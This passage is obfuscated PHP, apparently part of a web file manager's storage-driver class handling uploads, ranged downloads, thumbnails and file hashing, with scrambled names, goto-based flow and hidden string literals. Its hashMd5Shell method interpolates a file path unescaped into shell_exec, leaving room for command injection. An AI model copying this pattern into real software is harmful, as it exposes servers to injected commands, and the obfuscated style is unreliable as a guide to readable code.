$_SERVER[°Óó£ÌİóèÅ][8]; @mkdir($bË’Êè‡Â, 511, !0); goto bè¶¼ÆòŞ; A°­›à¡Ç¡: return $d©†Éˆ™; goto a±ÄÓåÉ¿ì; bè¶¼ÆòŞ: $d©†Éˆ™ = $bË’Êè‡Â . $a‡¦©©öÁ°; @touch($d©†Éˆ™); if ($aÀÀËñìÀ) { file_put_contents($d©†Éˆ™, $aÀÀËñìÀ); } goto A°­›à¡Ç¡; a±ÄÓåÉ¿ì: } public function tempFileRemve($fªß«Ø‰µ) { @unlink($fªß«Ø‰µ); @rmdir($this->pathFather($fªß«Ø‰µ)); } public function mkfile($D²¦—³ÑÃ“, $CµƒÃÒù§ = '', $bôìªø†‰’ = REPEAT_RENAME) { } public function mkdir($b²¶Ì›êäê, $cİ•®»·µš = REPEAT_SKIP) { } public function copyFile($AÏó«‘¯Öó, $Bœ…ìø¼ã) { } public function moveFile($Dæï¬êˆÉ˜, $Fš¾¯ÂÙª¯) { } public function remove($a¤¹æ¦³ª) { if ($this->isFile($a¤¹æ¦³ª)) { return $this->delFile($a¤¹æ¦³ª); } return $this->delFolder($a¤¹æ¦³ª); } public function rename($E«ô“º”¬¶, $f¡½²¡¦¯“) { } public function exist($E³šÈĞ ğ‡) { } public function findByHash($E¡äÛÒ´›‹ = '', $Bè‡òÈƒ© = '') { return !1; } public function isFile($aŞñ‘ó»õˆ) { } public function isFolder($C–ÏÊ‡¼¶) { } public function size($dŸİ¼ª‡À‹) { } public function info($FÕä…ØËğ) { } public function infoAuth($eÒÎ¬š¶—Â) { return $this->info($eÒÎ¬š¶—Â); } public function infoFull($Dàê¨Å‹ëÄ) { return $this->info($Dàê¨Å‹ëÄ); } public function infoWithChildren($C§­Š’—¡´) { $D¾äñ°ğ¢ =& $_SERVER[°Óó£ÌİóèÅ]; $Eì©Ä•ÏØ„ = $this->info($C§­Š’—¡´); if ($Eì©Ä•ÏØ„ && $Eì©Ä•ÏØ„[$D¾äñ°ğ¢[29]] == $D¾äñ°ğ¢[85]) { $BˆŠâÃ®’ô = array($D¾äñ°ğ¢[86] => 0, $D¾äñ°ğ¢[87] => 0, $D¾äñ°ğ¢[88] => 0); $this->infoChildren($C§­Š’—¡´, $BˆŠâÃ®’ô); $Eì©Ä•ÏØ„[$D¾äñ°ğ¢[86]] = $BˆŠâÃ®’ô[$D¾äñ°ğ¢[86]]; $Eì©Ä•ÏØ„[$D¾äñ°ğ¢[89]] = array($D¾äñ°ğ¢[90] => $BˆŠâÃ®’ô[$D¾äñ°ğ¢[87]], $D¾äñ°ğ¢[91] => $BˆŠâÃ®’ô[$D¾äñ°ğ¢[88]]); } return $Eì©Ä•ÏØ„; } public function listPath($fíŞĞ±•¯ù, $DÅ¦†º‡Â‡ = false) { } public function has($Fëğˆ­ÏÖ, $F¢ôéÕ¤¥İ = false, $aã¬ÃŒ™Õ¢ = false) { } public function canRead($CÜæ–õÌŒ) { } public function canWrite($eí‡±£ÑƒÉ) { } public function getContent($dá¨œ¾šÄ) { } public function setContent($fˆöË»¦‰, $bÄ½˜ˆ¶ñ = '') { } protected function infoChildren($aß˜Šæèƒ˜, &$BÖòê…­™ƒ) { $CİÒ„ Èí =& $_SERVER[°Óó£ÌİóèÅ]; check_abort(); $a†ÚÈ¥ÔÛè = $this->listPath($aß˜Šæèƒ˜, !0); $a†ÚÈ¥ÔÛè = array_merge($a†ÚÈ¥ÔÛè[$CİÒ„ Èí[83]], $a†ÚÈ¥ÔÛè[$CİÒ„ Èí[82]]); foreach ($a†ÚÈ¥ÔÛè as $f‹¬ù›ìƒ×) { if ($f‹¬ù›ìƒ×[$CİÒ„ Èí[29]] == $CİÒ„ Èí[85]) { $BÖòê…­™ƒ[$CİÒ„ Èí[88]]++; $cÀí«É°ç… = $this->getPathInner($f‹¬ù›ìƒ×[$CİÒ„ Èí[84]]); $this->infoChildren($cÀí«É°ç…, $BÖòê…­™ƒ); } else { $BÖòê…­™ƒ[$CİÒ„ Èí[87]]++; $BÖòê…­™ƒ[$CİÒ„ Èí[86]] += $f‹¬ù›ìƒ×[$CİÒ„ Èí[86]]; } } } public function fileSubstr($F±˜šä¶÷ç, $cÖ™Ú–Ÿ–¡, $E°ÍÃ±Š³ã) { } public function listAll($b²õâ¶Ú†ø) { } public function upload($D‚Ï‘¬¸‹ò, $b¡¦ÜÉ­·ğ, $eİæâçÉÒˆ = false, $bŒÙ¢¼»¼‰ = REPEAT_REPLACE) { } public function uploadFileByID($f–¹»ø‚ÍÙ, $fœêİ•İÅö, $F•òÍÄ»åª) { } public function uploadFileByPath($A°òŸäÇŠÁ, $dŒÀ‚ªÉ”Î, $C˜¢Ùù° = array()) { } public function uploadLink($C•½¨Û„‚, $AÒã’¨©´Ú = 0) { goto Eâ´õçŞÀ; d´ÉÀºîğ´: if (!in_array($d›Ì¼ÄÔŒ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Dôô¦ÂØ Õ = 1024 * 1024 * 10; goto bëÊ›­¿‘¢; bëÊ›­¿‘¢: $A±˜ß‚ñí† = $AÒã’¨©´Ú <= $Dôô¦ÂØ Õ ? $e’Æ¬¿ôÛ‡[94] : $e’Æ¬¿ôÛ‡[95]; if ($d›Ì¼ÄÔŒ == $e’Æ¬¿ôÛ‡[69]) { $A±˜ß‚ñí† = $e’Æ¬¿ôÛ‡[95]; } $e§ Ìï¿ôŠ = (!$AÒã’¨©´Ú ? 1 : ceil($AÒã’¨©´Ú / pow(1024, 3))) * 3600 * 4; goto a·Ì›“©®¾; a·Ì›“©®¾: $D®•ºõ‘„­ = $this->{$A±˜ß‚ñí†}($C•½¨Û„‚, $e§ Ìï¿ôŠ); if ($D®•ºõ‘„­) { $D®•ºõ‘„­[$e’Æ¬¿ôÛ‡[96]] = $C•½¨Û„‚; $D®•ºõ‘„­[$e’Æ¬¿ôÛ‡[97]] = $d›Ì¼ÄÔŒ; } return $D®•ºõ‘„­; goto e†ìŒÄÀ¹Ó; Eâ´õçŞÀ: $e’Æ¬¿ôÛ‡ =& $_SERVER[°Óó£ÌİóèÅ]; if ($GLOBALS[$e’Æ¬¿ôÛ‡[6]][$e’Æ¬¿ôÛ‡[92]][$e’Æ¬¿ôÛ‡[93]]) { return; } $d›Ì¼ÄÔŒ = $this->getType(); goto d´ÉÀºîğ´; e†ìŒÄÀ¹Ó: } public function uploadFormData($b®ÈùÃ…¦À, $Fù…Óô¹Õ = 3600) { } public function multiUploadFormData($eù¢Ùº¹Ã, $dÃˆ¥ï¦ìˆ = 3600) { } public function osChunkSize() { $dİÏé´Î“§ =& $_SERVER[°Óó£ÌİóèÅ]; $c…ÂÂ§‰±¹ = $GLOBALS[$dİÏé´Î“§[6]][$dİÏé´Î“§[92]][$dİÏé´Î“§[98]][$dİÏé´Î“§[99]]; if (!$c…ÂÂ§‰±¹) { $c…ÂÂ§‰±¹ = 1024 * 84 * 10; } return $c…ÂÂ§‰±¹; } public function download($E‹ƒì¿ï‡¶, $bÆòÁ¸–ë¸) { } public function ext($f³‰¼èø«) { $bÕŒƒù‘½í =& $_SERVER[°Óó£ÌİóèÅ]; if (strpos($f³‰¼èø«, $bÕŒƒù‘½í[8]) === -1) { $A®¾ííƒ¦ª = $f³‰¼èø«; } else { $A®¾ííƒ¦ª = $this->pathThis($f³‰¼èø«); } $e¾ËÛŠ÷¦ = $bÕŒƒù‘½í[33]; if (strstr($A®¾ííƒ¦ª, $bÕŒƒù‘½í[100])) { $e¾ËÛŠ÷¦ = substr($A®¾ííƒ¦ª, strrpos($A®¾ííƒ¦ª, $bÕŒƒù‘½í[100]) + 1); $e¾ËÛŠ÷¦ = strtolower($e¾ËÛŠ÷¦); } if (strlen($e¾ËÛŠ÷¦) > 3 && preg_match($bÕŒƒù‘½í[101], $e¾ËÛŠ÷¦, $Dâö†»¶œï)) { $e¾ËÛŠ÷¦ = $bÕŒƒù‘½í[33]; } return $e¾ËÛŠ÷¦; } public function pathThis($F‹Ù…Ìã›×) { $d…–ÔÃ²ˆ =& $_SERVER[°Óó£ÌİóèÅ]; $F‹Ù…Ìã›× = str_replace($d…–ÔÃ²ˆ[102], $d…–ÔÃ²ˆ[8], rtrim($F‹Ù…Ìã›×, $d…–ÔÃ²ˆ[8])); $FÎ‘†ìÓâ’ = strrpos($F‹Ù…Ìã›×, $d…–ÔÃ²ˆ[8]); if ($FÎ‘†ìÓâ’ === !1) { return $F‹Ù…Ìã›×; } return substr($F‹Ù…Ìã›×, $FÎ‘†ìÓâ’ + 1); } public function pathFather($e¿Üñ¿®îô) { $FÉ½°ŠÇ  =& $_SERVER[°Óó£ÌİóèÅ]; $e¿Üñ¿®îô = str_replace($FÉ½°ŠÇ [102], $FÉ½°ŠÇ [8], rtrim($e¿Üñ¿®îô, $FÉ½°ŠÇ [8])); $eìŸŒ¯¡•ã = strrpos($e¿Üñ¿®îô, $FÉ½°ŠÇ [8]); if ($eìŸŒ¯¡•ã === !1) { return $FÉ½°ŠÇ [33]; } return substr($e¿Üñ¿®îô, 0, $eìŸŒ¯¡•ã + 1); } public function hashSimple($bÍ§£–Ôë²) { goto cä«„À«Óò; BâÉŞõŒ¶ğ: $A›ƒ¯· É = intval($b¢õÅœŠŒ¡ / $fœ…Ğƒ¤Œø); $aâãÚ×†· = $dÖ¯³ĞùÓ[33]; for ($a´¨İĞåŸ = 0; $a´¨İĞåŸ < $fœ…Ğƒ¤Œø; $a´¨İĞåŸ++) { $aâãÚ×†· .= $this->fileSubstr($bÍ§£–Ôë², $A›ƒ¯· É * $a´¨İĞåŸ, $bŞ‚èÀŞÏ); } goto Dİ‡Ô•´Â˜; A½‰£¿êÖ: $bŞ‚èÀŞÏ = 200; $fœ…Ğƒ¤Œø = 50; if ($b¢õÅœŠŒ¡ <= $bŞ‚èÀŞÏ * $fœ…Ğƒ¤Œø) { return $this->hashMd5($bÍ§£–Ôë²) . $b¢õÅœŠŒ¡; } goto BâÉŞõŒ¶ğ; cä«„À«Óò: $dÖ¯³ĞùÓ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$bÍ§£–Ôë²) { return md5($dÖ¯³ĞùÓ[33]); } $b¢õÅœŠŒ¡ = $this->size($bÍ§£–Ôë²); goto A½‰£¿êÖ; Dİ‡Ô•´Â˜: $aâãÚ×†· .= $this->fileSubstr($bÍ§£–Ôë², $b¢õÅœŠŒ¡ - $bŞ‚èÀŞÏ, $bŞ‚èÀŞÏ); return md5($aâãÚ×†·) . $b¢õÅœŠŒ¡; goto b‰…ÚÑŒ™Û; b‰…ÚÑŒ™Û: } public static $md5Cache = array(); public function hashMd5($a÷‰¸ˆ•) { $a÷‰¸ˆ• = $this->iconvSystem($a÷‰¸ˆ•); if (isset(self::$md5Cache[$a÷‰¸ˆ•])) { return self::$md5Cache[$a÷‰¸ˆ•]; } self::$md5Cache[$a÷‰¸ˆ•] = $this->hashMd5Shell($a÷‰¸ˆ•); if (!self::$md5Cache[$a÷‰¸ˆ•]) { self::$md5Cache[$a÷‰¸ˆ•] = @md5_file($a÷‰¸ˆ•); } return self::$md5Cache[$a÷‰¸ˆ•]; } private function hashMd5Shell($A°Š¬­ê) { goto dù²Š§ñÎö; E†éñ°¿İ: $eÉéè²ç™Å = shell_exec($Cá»ö‘‡£¶ . "\40\42{$A°Š¬­ê}\42"); return substr($eÉéè²ç™Å, 0, 32); goto Fè‰Î‡†à; A¬ä—Ğ­Ì©: $Cá»ö‘‡£¶ = Cache::get($Dº·†¾“ÂÙ[106]); if (!$Cá»ö‘‡£¶) { $b»Ş¸ğÓóß = BASIC_PATH . $Dº·†¾“ÂÙ[107]; $C¸óÆ´ÖØä = md5_file($b»Ş¸ğÓóß); $Cá»ö‘‡£¶ = $Dº·†¾“ÂÙ[108]; foreach ($cµºòğê as $F…Ã½—•) { $eÉéè²ç™Å = shell_exec($F…Ã½—• . "\40\x22{$b»Ş¸ğÓóß}\x22"); if ($eÉéè²ç™Å && substr(trim($eÉéè²ç™Å), 0, 32) == $C¸óÆ´ÖØä) { $Cá»ö‘‡£¶ = $F…Ã½—•; break; } } Cache::set($Dº·†¾“ÂÙ[106], $Cá»ö‘‡£¶, 3600); } if ($Cá»ö‘‡£¶ == $Dº·†¾“ÂÙ[108]) { return !1; } goto E†éñ°¿İ; dù²Š§ñÎö: $Dº·†¾“ÂÙ =& $_SERVER[°Óó£ÌİóèÅ]; if (!function_exists($Dº·†¾“ÂÙ[103])) { return !1; } $cµºòğê = array($Dº·†¾“ÂÙ[104], $Dº·†¾“ÂÙ[105]); goto A¬ä—Ğ­Ì©; Fè‰Î‡†à: } public function link($bºÛÃš¹Õ®) { return $bºÛÃš¹Õ®; } public function fileOut($D‘›®¥³ÎØ, $C©ê¨Ú”¡Ì = false, $cÃ£ÄÈˆ™ = false, $F¤ä®àÂè = '') { goto c ¢ÆÒˆö; fîòºÙáÖ’: $AË Áêä‰£ = gmdate($cğ‹¾‹ÊŸù[113], $D¿‡—»ĞÏ¿[$cğ‹¾‹ÊŸù[114]]); $B“„¦«Èëõ = $cÃ£ÄÈˆ™ ? $cÃ£ÄÈˆ™ : $this->iconvApp($D¿‡—»ĞÏ¿[$cğ‹¾‹ÊŸù[28]]); $DØÕÜçÓ¡¸ = 0; goto e°±±»éÔæ; e°±±»éÔæ: $a¦šĞœ˜å” = $a•…»ƒ³„Ğ - 1; $C—ŒíÜîË· = $this->ext($B“„¦«Èëõ); if (in_array($C—ŒíÜîË·, array($cğ‹¾‹ÊŸù[115], $cğ‹¾‹ÊŸù[116], $cğ‹¾‹ÊŸù[117], $cğ‹¾‹ÊŸù[118]))) { $C—ŒíÜîË· = $cğ‹¾‹ÊŸù[119]; } goto E¿¶œ ¯¼Í; c ¢ÆÒˆö: $cğ‹¾‹ÊŸù =& $_SERVER[°Óó£ÌİóèÅ]; if (!$D‘›®¥³ÎØ || !$this->exist($D‘›®¥³ÎØ)) { show_json(LNG($cğ‹¾‹ÊŸù[109]), !1, $cÃ£ÄÈˆ™); } $F™Õ‹˜‰åá = $this->getType() == $cğ‹¾‹ÊŸù[110]; goto eİŒ…öôˆ; c‘˜Ÿùñ: if (isset($_SERVER[$cğ‹¾‹ÊŸù[152]])) { if (preg_match($cğ‹¾‹ÊŸù[153], $_SERVER[$cğ‹¾‹ÊŸù[152]], $a–ÓÅ‚ìÆ)) { $DØÕÜçÓ¡¸ = intval($a–ÓÅ‚ìÆ[1]); if (!empty($a–ÓÅ‚ìÆ[2])) { $a¦šĞœ˜å” = intval($a–ÓÅ‚ìÆ[2]); } } header($cğ‹¾‹ÊŸù[154]); header("\x43\157\156\164\x65\156\164\x2d\x52\141\156\x67\145\72\x20\142\x79\x74\145\163\40{$DØÕÜçÓ¡¸}\55{$a¦šĞœ˜å”}\x2f" . $a•…»ƒ³„Ğ); } else { header($cğ‹¾‹ÊŸù[155]); } header($cğ‹¾‹ÊŸù[156] . ($a¦šĞœ˜å” - $DØÕÜçÓ¡¸ + 1)); if ($_SERVER[$cğ‹¾‹ÊŸù[157]] == $cğ‹¾‹ÊŸù[158]) { return; } goto CÜ·¤Úöë; eİŒ…öôˆ: $BçÀ®ª¤Âò = $GLOBALS[$cğ‹¾‹ÊŸù[6]][$cğ‹¾‹ÊŸù[92]][$cğ‹¾‹ÊŸù[98]][$cğ‹¾‹ÊŸù[111]]; $BÔÕøéÅè = intval($GLOBALS[$cğ‹¾‹ÊŸù[6]][$cğ‹¾‹ÊŸù[92]][$cğ‹¾‹ÊŸù[98]][$cğ‹¾‹ÊŸù[112]] * 1024 * 1024); @ob_end_clean(); goto CÕ­Š¼ÓÑè; CÜ·¤Úöë: $a ¡ÀìÑ© = 1024 * 100; $AÏãÁÈ í¸ = 0; if ($BÔÕøéÅè) { $AÏãÁÈ í¸ = intval(1000 * 1000 * ($a ¡ÀìÑ© / $BÔÕøéÅè)); } goto aÛÒŠº¹À•; aÛÒŠº¹À•: while ($DØÕÜçÓ¡¸ <= $a¦šĞœ˜å”) { $eñ´Ñİªñ = timeFloat(); check_abort(); $càÊ¼³®‡ê = $a¦šĞœ˜å” - $DØÕÜçÓ¡¸ + 1; if ($càÊ¼³®‡ê <= $a ¡ÀìÑ©) { $a ¡ÀìÑ© = $càÊ¼³®‡ê; } echo $this->fileSubstr($D‘›®¥³ÎØ, $DØÕÜçÓ¡¸, $a ¡ÀìÑ©); $DØÕÜçÓ¡¸ += $a ¡ÀìÑ©; if ($a ¡ÀìÑ© == $càÊ¼³®‡ê) { $DØÕÜçÓ¡¸ = $a¦šĞœ˜å” + 1; } if ($AÏãÁÈ í¸) { $cœµÇ¦—¶× = intval(1000 * 1000 * (timeFloat() - $eñ´Ñİªñ)); $FÊ«ç§Ö˜… = $AÏãÁÈ í¸ - $cœµÇ¦—¶×; if ($FÊ«ç§Ö˜… > 5) { usleep($FÊ«ç§Ö˜…); } } } goto E¬ÑîÙóô; EõïŸö…•ß: if (strstr($bĞÖåÙŠù„, $cğ‹¾‹ÊŸù[121])) { $bĞÖåÙŠù„ = $bĞÖåÙŠù„ . $cğ‹¾‹ÊŸù[122]; } if ($C©ê¨Ú”¡Ì === !1 && !mime_support($bĞÖåÙŠù„)) { $C©ê¨Ú”¡Ì = !0; $bĞÖåÙŠù„ = $cğ‹¾‹ÊŸù[123]; } $B·Í«äÈÓ¿ = rawurlencode($B“„¦«Èëõ); goto E¤Ó¦‘ë¾½; B²¢Š‘ÀÎ: header($cğ‹¾‹ÊŸù[143]); $aßÏÖòê¦º = strtolower($_SERVER[$cğ‹¾‹ÊŸù[144]]); if ($F™Õ‹˜‰åá && $aßÏÖòê¦º && $BçÀ®ª¤Âò) { if (strstr($aßÏÖòê¦º, $cğ‹¾‹ÊŸù[145])) { header($cğ‹¾‹ÊŸù[146] . $D‘›®¥³ÎØ); } else { if (strstr($aßÏÖòê¦º, $cğ‹¾‹ÊŸù[147])) { header($cğ‹¾‹ÊŸù[148] . $D‘›®¥³ÎØ); } else { if (strstr($aßÏÖòê¦º, $cğ‹¾‹ÊŸù[149])) { header($cğ‹¾‹ÊŸù[150] . $D‘›®¥³ÎØ); } } } if ($BÔÕøéÅè) { header($cğ‹¾‹ÊŸù[151] . $BÔÕøéÅè); } return; } goto c‘˜Ÿùñ; CÕ­Š¼ÓÑè: set_timeout(); $D¿‡—»ĞÏ¿ = $this->infoFull($D‘›®¥³ÎØ); $a•…»ƒ³„Ğ = $D¿‡—»ĞÏ¿[$cğ‹¾‹ÊŸù[86]]; goto fîòºÙáÖ’; E¤Ó¦‘ë¾½: $B·Í«äÈÓ¿ = $cğ‹¾‹ÊŸù[120] . $B·Í«äÈÓ¿ . $cğ‹¾‹ÊŸù[124] . $B·Í«äÈÓ¿; if ($C©ê¨Ú”¡Ì) { header($cğ‹¾‹ÊŸù[125]); header($cğ‹¾‹ÊŸù[126] . $B·Í«äÈÓ¿); } else { header($cğ‹¾‹ÊŸù[127] . $B·Í«äÈÓ¿); } header($cğ‹¾‹ÊŸù[128]); goto CùëğÑ“; CùëğÑ“: header($cğ‹¾‹ÊŸù[129] . $bĞÖåÙŠù„); header($cğ‹¾‹ÊŸù[130] . gmdate($cğ‹¾‹ÊŸù[113], time() + 3600 * 24 * 30) . $cğ‹¾‹ÊŸù[131]); header($cğ‹¾‹ÊŸù[132]); goto f™¼Íƒ¹; E¿¶œ ¯¼Í: if (!$F¤ä®àÂè) { $F¤ä®àÂè = md5($AË Áêä‰£ . $this->hashSimple($D‘›®¥³ÎØ)); } $F¤ä®àÂè = $cğ‹¾‹ÊŸù[120] . $F¤ä®àÂè . $cğ‹¾‹ÊŸù[120]; $bĞÖåÙŠù„ = get_file_mime($C—ŒíÜîË·); goto EõïŸö…•ß; fˆ¢Ö•°ˆ: header($cğ‹¾‹ÊŸù[140] . $B“„¦«Èëõ); header($cğ‹¾‹ÊŸù[141]); header($cğ‹¾‹ÊŸù[142] . $a•…»ƒ³„Ğ); goto B²¢Š‘ÀÎ; f™¼Íƒ¹: header($cğ‹¾‹ÊŸù[133]); header($cğ‹¾‹ÊŸù[134]); if (isset($_SERVER[$cğ‹¾‹ÊŸù[135]]) && strtotime($_SERVER[$cğ‹¾‹ÊŸù[135]]) == $D¿‡—»ĞÏ¿[$cğ‹¾‹ÊŸù[114]]) { header($cğ‹¾‹ÊŸù[136], !0, 304); die; } goto c‰êÀÔëÎˆ; c‰êÀÔëÎˆ: if (isset($_SERVER[$cğ‹¾‹ÊŸù[137]]) && $_SERVER[$cğ‹¾‹ÊŸù[137]] == $F¤ä®àÂè) { header($cğ‹¾‹ÊŸù[138] . $F¤ä®àÂè, !0, 304); die; } header($cğ‹¾‹ÊŸù[138] . $F¤ä®àÂè); header($cğ‹¾‹ÊŸù[139] . $AË Áêä‰£ . $cğ‹¾‹ÊŸù[131]); goto fˆ¢Ö•°ˆ; E¬ÑîÙóô: } public function fileOutServer($DÜŒ´ƒİè, $DĞôÃŞ­‘Â = false, $aåóìé‰²» = false, $EñêÛ©šéË = '') { self::fileOut($DÜŒ´ƒİè, $DĞôÃŞ­‘Â, $aåóìé‰²», $EñêÛ©šéË); } public function fileOutLink($aÀêË‡Ì×‰) { $B†¾µÓ¨³ =& $_SERVER[°Óó£ÌİóèÅ]; if (substr($aÀêË‡Ì×‰, 0, 7) == $B†¾µÓ¨³[159]) { $aÀêË‡Ì×‰ = $B†¾µÓ¨³[160] . substr($aÀêË‡Ì×‰, 7); } header($B†¾µÓ¨³[161] . $aÀêË‡Ì×‰); die; } public function cacheMehod($bª›Îçâïâ, $D¢õÕ’«Êğ) { goto cÀ—Äœê¬ç; E¡¤ªñåÛÊ: $AŠÈ©õ•÷ = isset($Bª»¾àßá[$EÂÆ´èáƒ]) ? $Bª»¾àßá[$EÂÆ´èáƒ] : null; if (!is_null($AŠÈ©õ•÷)) { return $AŠÈ©õ•÷; } $AŠÈ©õ•÷ = $this->{$bª›Îçâïâ}($D¢õÕ’«Êğ); goto aöª„¥¥Ë; cÀ—Äœê¬ç: $dã‰ßº›¬Ò =& $_SERVER[°Óó£ÌİóèÅ]; static $Bª»¾àßá = array(); $EÂÆ´èáƒ = $dã‰ßº›¬Ò[162] . $bª›Îçâïâ . $dã‰ßº›¬Ò[163] . rtrim($D¢õÕ’«Êğ, $dã‰ßº›¬Ò[8]); goto E¡¤ªñåÛÊ; aöª„¥¥Ë: $Bª»¾àßá[$EÂÆ´èáƒ] = $AŠÈ©õ•÷; return $AŠÈ©õ•÷; goto EÅ±¯Ï“Ç; EÅ±¯Ï“Ç: } public function fileOutImage($CÃÉ¼õÔôÁ, $C’Á‰’ÃÀé = 250) { goto b†•‚›ğˆ”; Eà‹—‘¿æÁ: if (!($E°Ô½ã“Ù› = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Aœ‰¢öŠŒ[170]))) { $A¥ƒİÙ°–‰ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Aœ‰¢öŠŒ[171]); } else { $A¥ƒİÙ°–‰ = KodIO::make($E°Ô½ã“Ù›); } if ($E°Ô½ã“Ù› = IO::fileNameExist($A¥ƒİÙ°–‰, $fİÙÑ‹™)) { $C‰ÜŸ¹¢š = KodIO::make($E°Ô½ã“Ù›); return IO::fileOut($C‰ÜŸ¹¢š); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto aËœø‡œª»; b†•‚›ğˆ”: $Aœ‰¢öŠŒ =& $_SERVER[°Óó£ÌİóèÅ]; if (substr($CÃÉ¼õÔôÁ, 0, 4) == $Aœ‰¢öŠŒ[149]) { $this->fileOutLink($CÃÉ¼õÔôÁ); } $eÌäª‘½ˆÇ = $this->info($CÃÉ¼õÔôÁ); goto Cø‰ğ’òÚç; aËœø‡œª»: $C‰ÜŸ¹¢š = DATA_THUMB . $fİÙÑ‹™; if (!@file_exists($C‰ÜŸ¹¢š)) { $Fí©×œ‘¼ğ = TEMP_FILES; if (!is_dir($Fí©×œ‘¼ğ)) { mk_dir($Fí©×œ‘¼ğ); } $Dá¾ï´•¯ = $Fí©×œ‘¼ğ . $B†Õ…‘„ÒÉ . $Aœ‰¢öŠŒ[100] . $eÌäª‘½ˆÇ[$Aœ‰¢öŠŒ[165]]; if (!@file_exists($Dá¾ï´•¯)) { $Dá¾ï´•¯ = $this->download($CÃÉ¼õÔôÁ, $Dá¾ï´•¯); } $dÕÒ‘ñÛ¦¤ = new ImageThumb($Dá¾ï´•¯, $Aœ‰¢öŠŒ[172]); $dÕÒ‘ñÛ¦¤->prorate($C‰ÜŸ¹¢š, $C’Á‰’ÃÀé, $C’Á‰’ÃÀé); } if (!file_exists($C‰ÜŸ¹¢š) || filesize($C‰ÜŸ¹¢š) < 100) { return @file_exists($Dá¾ï´•¯) ? IO::fileOut($Dá¾ï´•¯) : $this->fileOut($CÃÉ¼õÔôÁ); } goto eßªë—÷‰É; Cø‰ğ’òÚç: if ($eÌäª‘½ˆÇ[$Aœ‰¢öŠŒ[86]] <= 1024 * 50 || !function_exists($Aœ‰¢öŠŒ[164]) || $eÌäª‘½ˆÇ[$Aœ‰¢öŠŒ[165]] == $Aœ‰¢öŠŒ[166]) { return $this->fileOut($CÃÉ¼õÔôÁ); } if (isset($eÌäª‘½ˆÇ[$Aœ‰¢öŠŒ[167]][$Aœ‰¢öŠŒ[168]])) { $B†Õ…‘„ÒÉ = $eÌäª‘½ˆÇ[$Aœ‰¢öŠŒ[167]][$Aœ‰¢öŠŒ[168]]; } else { if (isset($eÌäª‘½ˆÇ[$Aœ‰¢öŠŒ[167]][$Aœ‰¢öŠŒ[169]])) { $B†Õ…‘„ÒÉ = $eÌäª‘½ˆÇ[$Aœ‰¢öŠŒ[167]][$Aœ‰¢öŠŒ[169]]; } else { $B†Õ…‘„ÒÉ = md5("{$eÌäª‘½ˆÇ[$Aœ‰¢öŠŒ[28]]}\x5f{$eÌäª‘½ˆÇ[$Aœ‰¢öŠŒ[84]]}\137{$eÌäª‘½ˆÇ[$Aœ‰¢öŠŒ[86]]}"); } } $fİÙÑ‹™ = "{$B†Õ…‘„ÒÉ}\137{$C’Á‰’ÃÀé}\x2e\x70\156\147"; goto Eà‹—‘¿æÁ; eßªë—÷‰É: if (!($d»¬ÃÅ£ìÁ = IO::move($C‰ÜŸ¹¢š, $A¥ƒİÙ°–‰))) { return IO::fileOut($C‰ÜŸ¹¢š); } del_file($C‰ÜŸ¹¢š); IO::fileOut($d»¬ÃÅ£ìÁ); goto cƒùÈšÀ’; cƒùÈšÀ’: } public function fileOutImageServer($e¿åÂçÈ°, $eÃòÇ°«› = 250) { self::fileOutImage($e¿åÂçÈ°, $eÃòÇ°«›); } public function fileNameAuto($aîÕğâ×µ˜, $E³ˆôğÌÂ, $bï½¸Ş‘ãÓ = REPEAT_RENAME, $a´º³¡¯™ = false) { goto D‘§­½ß†ª; b÷†Ò‘Òë: while ($this->exist(rtrim($aîÕğâ×µ˜, $bñ„ğ¥¹¯Š[8]) . $bñ„ğ¥¹¯Š[8] . $AÇé—ôˆ’¨)) { $AÇé—ôˆ’¨ = $f¶†ê‡‹†˜ . "\x28{$b©â£ãÚÔ}\51{$AôÑÔ‹‰˜}"; $b©â£ãÚÔ++; } return $AÇé—ôˆ’¨; goto EÚô­Â˜»; B‚Àİ’ô¿: $b©â£ãÚÔ = 1; $f¶†ê‡‹†˜ = substr($E³ˆôğÌÂ, 0, strlen($E³ˆôğÌÂ) - strlen($AôÑÔ‹‰˜)); $AÇé—ôˆ’¨ = $f¶†ê‡‹†˜ . "\x28{$b©â£ãÚÔ}\x29{$AôÑÔ‹‰˜}"; goto b÷†Ò‘Òë; D‘§­½ß†ª: $bñ„ğ¥¹¯Š =& $_SERVER[°Óó£ÌİóèÅ]; $f´äŒˆó°… = $aîÕğâ×µ˜ === $bñ„ğ¥¹¯Š[33] ? $E³ˆôğÌÂ : rtrim($aîÕğâ×µ˜, $bñ„ğ¥¹¯Š[8]) . $bñ„ğ¥¹¯Š[8] . $E³ˆôğÌÂ; if ($bï½¸Ş‘ãÓ == REPEAT_REPLACE || !$this->exist($f´äŒˆó°…) || $a´º³¡¯™ && $bï½¸Ş‘ãÓ != REPEAT_RENAME_FOLDER) { return $E³ˆôğÌÂ; } goto eî“ßÚÈ½•; eî“ßÚÈ½•: if ($bï½¸Ş‘ãÓ == REPEAT_SKIP) { return !1; } $AôÑÔ‹‰˜ = $bñ„ğ¥¹¯Š[100] . get_path_ext($E³ˆôğÌÂ); $AôÑÔ‹‰˜ = $AôÑÔ‹‰˜ == $bñ„ğ¥¹¯Š[100] || $a´º³¡¯™ ? $bñ„ğ¥¹¯Š[33] : $AôÑÔ‹‰˜; goto B‚Àİ’ô¿; EÚô­Â˜»: } public function listAllFiles($aÛ™Œİõ‘ï, $fÀ×‹éÖ¦², $a˜Ô¢ô©õ = array()) { goto cñò†ùáÕ; f—öËóÒã: $aÛ™Œİõ‘ï = trim($aÛ™Œİõ‘ï, $E¤×í¢¾®›[8]); foreach ($fÀ×‹éÖ¦² as $aëŒâ¡õ’) { $fğã…ª¶¥ = ltrim(substr($aëŒâ¡õ’, strlen($aÛ™Œİõ‘ï)), $E¤×í¢¾®›[8]); $b…¿‹ªóš˜ = array_merge($b…¿‹ªóš˜, $this->slicePath($fğã…ª¶¥)); } $e„ÀÎŒ¢Ú = array(); goto dô¼ï‚ÆÉ; cñò†ùáÕ: $E¤×í¢¾®› =& $_SERVER[°Óó£ÌİóèÅ]; if (empty($fÀ×‹éÖ¦²)) { return array(); } $b…¿‹ªóš˜ = array(); goto f—öËóÒã; dô¼ï‚ÆÉ: foreach (array_unique($b…¿‹ªóš˜) as $aëŒâ¡õ’) { $d¦Îíï¥Ü¶ = array($E¤×í¢¾®›[84] => $this->getPathOuter($E¤×í¢¾®›[8] . 